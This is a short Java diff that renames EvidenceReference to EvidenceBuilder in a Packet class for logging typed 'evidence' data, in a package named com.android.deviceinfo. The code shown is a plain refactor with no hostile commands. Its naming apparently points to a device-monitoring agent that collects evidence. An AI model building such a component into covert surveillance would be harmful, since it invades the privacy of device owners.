@@ -11,7 +11,7 @@ package com.android.deviceinfo;
 
 import java.util.ArrayList;
 
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.util.Utils;
 
@@ -47,7 +47,7 @@ public class Packet {
 	 */
 	public Packet(final long unique) {
 		type = EvidenceType.NONE;
-		command = EvidenceReference.LOG_CREATE;
+		command = EvidenceBuilder.LOG_CREATE;
 		id = unique;
 		data = null;
 	}
@@ -57,13 +57,13 @@ public class Packet {
 	 */
 	public Packet() {
 		id = 0;
-		command = EvidenceReference.INTERRUPT;
+		command = EvidenceBuilder.INTERRUPT;
 	}
 
 	public Packet(int evidenceType, byte[] additional, byte[] data) {
 		type = evidenceType;
 		id = Utils.getRandom();
-		command = EvidenceReference.LOG_ATOMIC;
+		command = EvidenceBuilder.LOG_ATOMIC;
 		setData(data);
 		this.additional = additional;
 	}
@@ -71,7 +71,7 @@ public class Packet {
 	public Packet(int evidenceType, ArrayList<byte[]> items) {
 		type = evidenceType;
 		id = Utils.getRandom();
-		command = EvidenceReference.LOG_ITEMS;
+		command = EvidenceBuilder.LOG_ITEMS;
 		this.items = items;
 
 	}
